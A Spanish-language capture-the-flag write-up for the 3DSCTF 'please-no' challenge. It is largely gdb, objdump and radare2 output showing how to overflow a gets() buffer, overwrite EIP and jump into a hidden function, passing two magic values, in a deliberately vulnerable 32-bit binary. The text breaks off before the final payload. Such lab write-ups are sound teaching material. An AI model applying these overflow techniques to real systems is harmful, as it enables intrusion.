[EN]
This time the programmer did a better job to hid his flag. But the problem still: It’s vulnerable. Can you obtain the flag?
Send to 209.190.1.131 9003
NOW WITH SECRET BONUS!

[PT-BR]
Dessa vez o programador caprichou um pouco mais na hora de esconder sua flag. O problema que continua vulneravel. Consegue extrair a flag?
Envie para 209.190.1.131 9003
AGORA COM BONUS SECRETO!


Aquí hay soluciones que me han ayudado a entender como había que resolver este reto:

https://ctftime.org/task/3258
Solución

Es un archivo elf de 32 bits que "peta" al leer una cadena, el clásico buffer overflow. Para ver el offset, primero creamos un patrón con metasploit:

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Luego lo ejecutamos en gdb:

gdb -q ./please-no<br>Voltron loaded.<br>Reading symbols from ./please-no...(no debugging symbols found)...done.
>>> dashboard -output /dev/pts/1
>>> r
Starting program: /root/Documents/3DSCTF/please-no 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Program received signal SIGSEGV, Segmentation fault.
Traceback (most recent call last):
File "<string>", line 764, in lines
File "<string>", line 127, in run
gdb.error: No function contains program counter for selected frame.
During handling of the above exception, another exception occurred:
Traceback (most recent call last):
File "<string>", line 249, in on_stop
File "<string>", line 300, in build
File "<string>", line 782, in lines
gdb.MemoryError: Cannot access memory at address 0x37614136
0x37614136 in ?? ()
>>> quit

Y por último calculamos el offset:

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 0x37614136
[*] Exact match at offset 20

Echemos un vistazo a las protecciones que tiene el binario:

gdb -q ./please-no
Reading symbols from ./please-no...(no debugging symbols found)...done.
gdb-peda$ checksec 
CANARY	: disabled
FORTIFY	: disabled
NX	: ENABLED
PIE	: disabled
RELRO	: Partial

Como no podemos usar la pila para ejecutar un shellcode (NX enabled), echemos un vistazo al código:

objdump -D intel -S please-no

Noo tenemos una clásica función main, parece que nuestras funciones están escondidas en la sección .text
Si lo analizamos con radare2 sí nos detecta la función main:

main ();
; var int local_8h @ esp+0x8
; DATA XREF from 0x08048497 (entry0)
0x08048710	; sub esp, 0x1c
0x08048713	; lea eax, dword [esp + local_8h]
0x08048717	; mov dword [esp], eax
0x0804871a	; call sym.imp.gets
0x0804871f	; xor eax, eax
0x08048721	; add esp, 0x1c
0x08048724	ret<br>

Se puede ver claramente una llamada a la función gets (call sym.imp.gets).

080483f0 <gets@plt>:
80483f0:	ff 25 10 a0 04 08	jmp	DWORD PTR ds:0x804a010
80483f6:	68 08 00 00 00		push	0x8
80483fb:	e9 d0 ff ff ff		jmp	80483d

También hay otras funciones interesantes:

08048410 <strcat@plt>:
8048410:	ff 25 18 a0 04 08	jmp	DWORD PTR ds:0x804a018
8048416:	68 18 00 00 00		push	0x18
804841b:	e9 b0 ff ff ff		jmp	80483d0 <printf@plt-0x10>

08048440 <f_open@plt>:
8048440:	ff 25 24 a0 04 08	jmp	DWORD PTR ds:0x804a024
8048446:	68 30 00 00 00		push	0x30
804844b:	e9 80 ff ff ff		jmp	80483d0 <printf@plt-0x10>

Vemos que hay una línea en .text que llama a gets, este puede ser un buen sitio para poner un breakpoint.

804871a:	e8 d1 fc ff ff		call	80483f0 <gets@plt>
804871f:	31 c0			xor	eax,eax
8048721:	83 c4 1c		add	esp,0x1c
8048724:	c3			ret

>>> br *0x804871f
Breakpoint 1 at 0x804871f

python -c "print 'A'*20"
AAAAAAAAAAAAAAAAAAAA

Ejecutamos el programa y vemos el estado de la pila después de meter 20 "A":

>>> r
Starting program: /root/Documents/3DSCTF/please-no 
AAAAAAAAAAAAAAAAAAAA
Breakpoint 1, 0x0804871f in ?? ()
>>> x/32xw $esp
0xbffff350	0xbffff358	0x0804824c	0x41414141	0x41414141
0xbffff360	0x41414141	0x41414141	0x41414141	0xb7e13200 <--
0xbffff370	0x00000001	0xbffff404	0xbffff40c	0x00000000

La flecha, que corresponde con la posición de la pila 0xbffff36c, indica el valor que tendremos que sobrescribir para controlar el EIP.
Recordar que aún nos quedan por ejecutar estas dos instrucciones de gets antes de ejecutar el return:

804871f:	31 c0			xor	eax,eax
8048721:	83 c4 1c		add	esp,0x1c
8048724:	c3			ret

Ya sabemos como controlar el EIP, pero ¿hacia donde lo apuntamos?
En el código de la sección .text aparece algo interesante:

8048690:	83 ec 1c             	sub    esp,0x1c
8048693:	81 7c 24 20 41 0c 0b 	cmp    DWORD PTR [esp+0x20],0x1b0b0c41   <--- Comparación sospechosa
804869a:	1b 
804869b:	75 2d                	jne    80486ca <fgetc@plt+0x26a>         <--- Me echa si no coincide con 0x1b0b0c41
804869d:	81 7c 24 24 4e 37 13 	cmp    DWORD PTR [esp+0x24],0xae13374e   <--- Otra comparación sospechosa ¿dónde quiere ir?
80486a4:	ae 
80486a5:	75 23                	jne    80486ca <fgetc@plt+0x26a>         <--- Me echa al mismo sitio si no coincide con 0xae13374e
80486a7:	c7 44 24 16 6d 66 6c 	mov    DWORD PTR [esp+0x16],0x616c666d	 <--- ¿Mete en la pila el nombre del fichero? 0x616c666d='alfm'
80486ae:	61 
80486af:	66 c7 44 24 1a 67 00 	mov    WORD PTR [esp+0x1a],0x67			     <--- ¿Y luego una 'g'? ¿'mflag' nombre del fichero? ¿extensión?
80486b6:	8d 44 24 16          	lea    eax,[esp+0x16]                    <--- Carga la posición de memoria donde está 'mflag'
80486ba:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax           <--- Nombre del fichero como arg2 de strcat
80486be:	c7 04 24 39 a0 04 08 	mov    DWORD PTR [esp],0x804a039         <--- Puntero como arg1 donde guardar resultado
80486c5:	e8 46 fd ff ff       	call   8048410 <strcat@plt>
80486ca:	83 c4 1c             	add    esp,0x1c
80486cd:	c3                   	ret    

Vamos a apuntar el EIP a 0x8048690 y además añadimos los dos valores para superar la doble comparación (0x1b0b0c41 y 0xae13374e). 
Podemos tener la tentación de saltar directamente a 0x80486a7 pero entonces no se ejecutaría el 'sub esp,0x1c' que es básico para
preparar la llamada a strcat. 
set {int}0xbffff36c = 0x08048690

Una vez ejecutada la instrucción 0x8048690 la pila quedaría así:
>>> x/32xw $esp
0xbffff354:	0x0804824c	0x41414141	0x41414141	0x41414141
0xbffff364:	0x41414141	0x41414141	0x08048690	0x00000001
0xbffff374:	0xbffff404	0xbffff40c	0x00000000	0x00000000

Para asegurarnos de que cumpla las dos comparaciones habrá que poner esos valores en su lugar correspondiente en la pila:
([esp+0x20]=0xbffff374 y [esp+0x24]=0xbffff378)
set {int}0xbffff374 = 0x1b0b0c41
set {int}0xbffff378 = 0xae13374e

Estado de la pila:
>>> x/32xw $esp
0xbffff354:	0x0804824c	0x41414141	0x41414141	0x41414141
0xbffff364:	0x41414141	0x41414141	0x08048690	0x00000001
0xbffff374:	0x1b0b0c41	0xae13374e	0x00000000	0x00000000





